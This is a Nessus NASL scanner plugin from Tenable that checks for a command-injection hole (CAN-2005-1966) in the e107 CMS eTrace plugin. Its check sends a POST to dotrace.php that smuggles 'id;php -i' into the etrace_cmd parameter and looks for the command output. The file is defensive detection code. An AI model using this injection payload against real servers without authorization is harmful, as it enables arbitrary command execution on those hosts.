#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18479);
  script_version("$Revision: 1.4 $");
  script_cve_id("CAN-2005-1966");
  script_bugtraq_id(13934);

  name["english"] = "e107 eTrace Plugin Arbitrary Code Execution Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The installation of the e107 content management system on the remote
host includes the eTrace plugin.  This plugin fails to sanitize the
'etrace_cmd' and 'etrace_host' parameters of the 'dotrace.php' script
before using them in a system() call.  An attacker can exploit this
flaw to execute arbitrary shell commands subject to the privileges of
the userid under which the affected application runs. 

Solution : Upgrade to eTrace plugin version 1.02 or later.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for arbitrary code execution vulnerability in e107 eTrace plugin";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# For each CGI directory...
foreach dir (cgi_dirs()) {
  url = string(dir, "/e107_plugins/etrace/dotrace.php");

  # Check whether the affected script exists.
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like dotrace.php...
  if ("Invalid address - potential hacking attempt" >< res) {
    # Try to exploit the flaw by running "id" and "php -i".
    postdata = string(
      "etrace_cmd=id;php%20-i;&",
      "etrace_host=127.0.0.1&"
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if the results look like output from...
    if (
      # either the id command...
      egrep(string:res, pattern:"uid=[0-9]+.* gid=[0-9]") ||
      # or phpinfo.
      "PHP Version =>" >< res
    ) {
      security_hole(port);
      exit(0);
    }
  }
}
